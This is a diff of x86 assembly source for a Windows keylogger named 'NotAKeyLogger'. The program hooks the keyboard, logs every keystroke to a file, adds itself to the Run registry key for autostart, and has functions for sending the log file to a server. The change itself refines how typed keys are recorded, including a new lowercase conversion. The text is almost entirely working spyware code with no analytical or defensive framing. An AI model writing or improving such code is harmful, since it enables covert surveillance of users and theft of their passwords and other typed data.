@@ -11,8 +11,6 @@ CheckPowerButton PROTO
 CompareStrings PROTO : DWORD, : DWORD
 InstallHook PROTO : DWORD
 UninstallHook PROTO
-Process32Next PROTO : DWORD, : DWORD
-Process32First PROTO : DWORD, : DWORD
 FillSocketAddress PROTO : DWORD
 SendFileToServer PROTO
 CreateSocket PROTO
@@ -38,7 +36,6 @@ processName db 'NotAKeyLogger.exe', 0
 newLine db " ", 13, 10, 0
 autoKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
 value db 'NotAKeyLogger', 0
-caps db '(CP)', 0
 powerButton db '(PB)', 0
 
 LPSYSTEMTIME STRUCT
@@ -51,6 +48,7 @@ LPSYSTEMTIME STRUCT
     wSecond        WORD ?
     wMilliseconds  WORD ?
 LPSYSTEMTIME ENDS
+
 localTime LPSYSTEMTIME <>
 date_buf   db 50 dup (32)
 time_buf   db 20 dup (32)																													
@@ -318,23 +316,26 @@ CheckParams:
 CheckIfKeyIsSpecial:		
 		call			CheckCapital
 		test			eax, eax
-		jnz			WriteCapsLockKey
+		jnz			WriteUpperCaseKey
 		INVOKE		CheckPowerButton
 		test			eax, eax
 		jnz			WritePowerButton
-		jmp			WriteKey
+		jmp			WriteLowerCaseKey
 
-WriteCapsLockKey:			
-		INVOKE		WriteToFile, OFFSET caps
-		jmp			WriteKey
+WriteUpperCaseKey:			
+		INVOKE		WriteToFile, lParam
+		jmp			PostSuccessCallNextHook
+
+WriteLowerCaseKey:
+		mov			edx, lParam
+		ASSUME	edx: PTR KBDLLHOOKSTRUCT												;structure stores information about pressed key
+		or				[edx].vkCode, 20h																;converting key to lowercase
+		INVOKE		WriteToFile, lParam
+		jmp			PostSuccessCallNextHook
 
 WritePowerButton:			
 		INVOKE		WriteToFile, OFFSET powerButton
 		INVOKE		ExitProcess, 0																	;can be modified later
-
-WriteKey:						
-		INVOKE		WriteToFile, lParam
-		;PostSuccessCallNextHook will be called, everything is fine (even if we couldn't write character to file)
 
 PostSuccessCallNextHook:						
 		INVOKE		CallNextHookEx, hHook, nCode, WM_KEYUP, lParam				;called on success
